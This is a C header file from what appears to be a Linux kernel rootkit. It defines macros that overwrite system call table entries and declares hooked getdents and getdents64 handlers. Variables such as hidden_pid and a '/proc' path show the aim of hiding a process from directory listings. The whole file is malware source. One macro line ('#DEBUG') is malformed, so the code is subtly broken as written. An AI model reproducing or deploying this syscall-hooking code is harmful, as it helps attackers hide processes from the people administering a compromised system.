#ifndef MAIN_H
#define MAIN_H
    #include <linux/module.h>
    #include <linux/kernel.h>
    #include <linux/syscalls.h>
    #include <linux/delay.h>
    #include <asm/paravirt.h>
    #include <linux/dirent.h>
    #include <linux/file.h>
    #include <linux/fs.h>
    #include <asm/uaccess.h>
    #include <linux/slab.h>
    #include <linux/path.h>
    #include <linux/namei.h>
    #include <linux/fs_struct.h> 
    #include <asm/cacheflush.h>
    #include <linux/version.h> 
    #include <linux/kallsyms.h>
    #include <linux/trace.h>
    #include <linux/irq_work.h> 
    #include <asm/uaccess.h>
    #include <linux/namei.h>

    #define register(name)                                     \
        ref_sys_##name = (void *)sys_call_table_[__NR_##name]; \
        sys_call_table_[__NR_##name] = (unsigned long *)new_sys_##name;

    #define unregister(name) \
        sys_call_table_[__NR_##name] = (unsigned long *)ref_sys_##name;

    #DEBUG(FMT_STRING,...) printk(KERN_ALERT FMT_STRING "\n", ##__VA_ARGS__)

    extern unsigned long __force_order;

    // struct linux_dirent64 is already defined in linux/dirent.h
    struct linux_dirent
    {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[1];
    };


    unsigned long **sys_call_table_;
    unsigned long original_cr0;

    typedef asmlinkage long (*t_syscall)(const struct pt_regs *);    
    
    asmlinkage long new_sys_getdents(const struct pt_regs *pt_regs);
    asmlinkage long new_sys_getdents64(const struct pt_regs *pt_regs);

    static t_syscall ref_sys_getdents;

    static t_syscall ref_sys_getdents64;

    const char *proc_path = "/proc"; // hiding /proc/<PID>
    int inode_proc; // the inode of the dir /proc
    char hidden_pid[1024] = "NOTPID\x00";

#endif
